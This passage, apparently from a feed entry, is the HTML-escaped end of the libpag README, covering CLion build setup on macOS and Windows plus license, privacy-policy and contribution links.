synchronizing automatically next time.&lt;/p&gt; &#xA;&lt;h3&gt;Build&lt;/h3&gt; &#xA;&lt;p&gt;After the synchronization, you can open the project with CLion and build the pag library.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;For macOS platform：&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;There are no extra configurations of CLion required.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;For Windows platform：&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Please follow the following steps to configure the CLion environment correctly:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Make sure you have installed at least the &lt;strong&gt;[Desktop development with C++]&lt;/strong&gt; and &lt;strong&gt;[Universal Windows Platform development]&lt;/strong&gt; components for VS2019.&lt;/li&gt; &#xA; &lt;li&gt;Open the &lt;strong&gt;File-&amp;gt;Setting&lt;/strong&gt; panel, and go to &lt;strong&gt;Build, Execution, Deployment-&amp;gt;ToolChains&lt;/strong&gt;, then set the toolchain of CLion to &lt;strong&gt;Visual Studio&lt;/strong&gt; with &lt;strong&gt;amd64 (Recommended)&lt;/strong&gt; or &lt;strong&gt;x86&lt;/strong&gt; architecture.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note: If anything goes wrong during cmake building, please update the cmake commandline tool to the latest version and try again.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Support Us&lt;/h2&gt; &#xA;&lt;p&gt;If you find libpag is helpful, please give us a &lt;strong&gt;Star&lt;/strong&gt;. We sincerely appreciate your support :)&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://starchart.cc/Tencent/libpag&#34;&gt;&lt;img src=&#34;https://starchart.cc/Tencent/libpag.svg?sanitize=true&#34; alt=&#34;Stargazers over time&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;libpag is licensed under the &lt;a href=&#34;https://raw.githubusercontent.com/Tencent/libpag/main/LICENSE.txt&#34;&gt;Apache Version 2.0 License&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Privacy Policy&lt;/h2&gt; &#xA;&lt;p&gt;Please comply with &lt;a href=&#34;https://privacy.qq.com/document/preview/01e79d0cc7a2427ba774b88c6beff0fd&#34;&gt;the personal information processing rules of PAG SDK&lt;/a&gt; while using libpag SDK&lt;/p&gt; &#xA;&lt;h2&gt;Contribution&lt;/h2&gt; &#xA;&lt;p&gt;If you have any ideas or suggestions to improve libpag, welcome to submit an &lt;a href=&#34;https://github.com/Tencent/libpag/issues/new/choose&#34;&gt;issue&lt;/a&gt; / &lt;a href=&#34;https://github.com/Tencent/libpag/pulls&#34;&gt;pull request&lt;/a&gt;. Before making a pull request or issue, please make sure to read &lt;a href=&#34;https://raw.githubusercontent.com/Tencent/libpag/main/CONTRIBUTING.md&#34;&gt;Contributing Guide&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
</feed>